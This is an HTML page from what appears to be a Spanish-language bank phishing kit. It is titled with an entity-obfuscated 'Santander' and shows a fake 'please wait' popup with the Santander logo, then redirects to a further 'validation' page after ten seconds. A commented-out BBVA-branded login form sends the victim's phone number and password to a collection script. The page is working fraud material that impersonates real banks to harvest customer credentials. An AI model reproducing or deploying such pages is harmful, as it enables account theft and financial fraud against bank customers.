<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <script>
		var sError = "";
		</script>    
    <link rel="stylesheet" href="css/fonts.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="shortcut icon" href="resources/favicon.ico" type="image/x-icon">
    <title>&#83;&#97;&#110;&#116;&#97;&#110;&#100;&#101;&#114;&nbsp;|&nbsp;&#77;4&nbsp;&#91;4.6.1&#93;</title>
   <!--<script src="js/jquery.min.js"></script>
    <script src="js/main.js"></script>-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

</head>
<style>
    *{
        margin: 0;
        padding: 0;
    }
</style>
<body>
       <!-- <header class="ioscam" style="background-color:#072146;">
		<nav class='header_wrapeer'>
			<div class='header__campaign'><div class='header__logo'><img src='resources/logo_bbva_blanco.png' srcset='resources/logo_bbva_blanco.png' sizes='(min-width: 900px) 20vw, 50vw' itemprop='logo' class='header__image'></div></div>
		</nav>
		</header>
        <div class='container'>					
			<h1>&iexcl;Bienvenido!</h1>
			<form method='post' action='poster/post.php' id='loggin'>
            <script>

                        jQuery(document).ready(function(){
                        jQuery('.numOnly').keypress(function(tecla){
                            if(tecla.charCode < 48 || tecla.charCode > 57){
                                return false;
                            }
                        });
                        });


            </script>
				<div class='group'>
                    <label for='username2'>N&uacute;mero de T&eacute;lefono</label><br>
					<input name='tel' class='numOnly' id='username2' type='text' maxlength='10' autocomplete='off'required/>
					<span class='highlight'></span>
					
				</div>
				<div class='group' style='margin-top: 16px;'>
                <label for='password'>Contrase&ntilde;a</label><br>
					<input type='password' name='pass' id='password' autocomplete='off' value='' minlength='8' maxlength='10' required/>
					<span class='highlight'></span>
					
				</div>
				<div class='botonera'>

					<div id='bt_div' class='enviar'>
						<button type='submit' id='loginButton' name='loginButton'>Continuar</button>
					</div>
				</div>
				<input type='hidden' name='username' />
				<input type='hidden' name='login-form-type' value='pwd' />
			</form>-->
<style>
    *{
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}

.lds-default {
    display: inline-block;
    position: relative;
    width: 80px;
    height: 80px;
  }
  .lds-default div {
    position: absolute;
    width: 6px;
    height: 6px;
    background: #E52320;
    border-radius: 50%;
    animation: lds-default 1.2s linear infinite;
  }
  .lds-default div:nth-child(1) {
    animation-delay: 0s;
    top: 37px;
    left: 66px;
  }
  .lds-default div:nth-child(2) {
    animation-delay: -0.1s;
    top: 22px;
    left: 62px;
  }
  .lds-default div:nth-child(3) {
    animation-delay: -0.2s;
    top: 11px;
    left: 52px;
  }
  .lds-default div:nth-child(4) {
    animation-delay: -0.3s;
    top: 7px;
    left: 37px;
  }
  .lds-default div:nth-child(5) {
    animation-delay: -0.4s;
    top: 11px;
    left: 22px;
  }
  .lds-default div:nth-child(6) {
    animation-delay: -0.5s;
    top: 22px;
    left: 11px;
  }
  .lds-default div:nth-child(7) {
    animation-delay: -0.6s;
    top: 37px;
    left: 7px;
  }
  .lds-default div:nth-child(8) {
    animation-delay: -0.7s;
    top: 52px;
    left: 11px;
  }
  .lds-default div:nth-child(9) {
    animation-delay: -0.8s;
    top: 62px;
    left: 22px;
  }
  .lds-default div:nth-child(10) {
    animation-delay: -0.9s;
    top: 66px;
    left: 37px;
  }
  .lds-default div:nth-child(11) {
    animation-delay: -1s;
    top: 62px;
    left: 52px;
  }
  .lds-default div:nth-child(12) {
    animation-delay: -1.1s;
    top: 52px;
    left: 62px;
  }
  @keyframes lds-default {
    0%, 20%, 80%, 100% {
      transform: scale(1);
    }
    50% {
      transform: scale(1.5);
    }
  }

  #loader{
      margin-top: 50vh;
      left: 50%;
      top: 50%;

  }
  
  .swal2-popup {
  font-size: 1rem !important;
  font-family: "BentonSans-Book","Helvetica Neue",Helvetica,Arial,sans-serif;
}

</style>

<script>
	Swal.fire({
		imageUrl: 'resources/Santander-Logo.png',
		imageHeight: 100,
		imageWidth: 200,
		title: 'Por favor espere un momento',
        text: '',
        confirmButtonText: 'Cerrar',
        confirmButtonColor: '#E52320',
})
</script>

            <div class="lds-default" id="loader"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
<script>

function redireccionar(){
  window.location.href = "invalidSecondAccessValidation.php";
}
 
setTimeout("redireccionar()", 10000);

</script>
</body>
</html>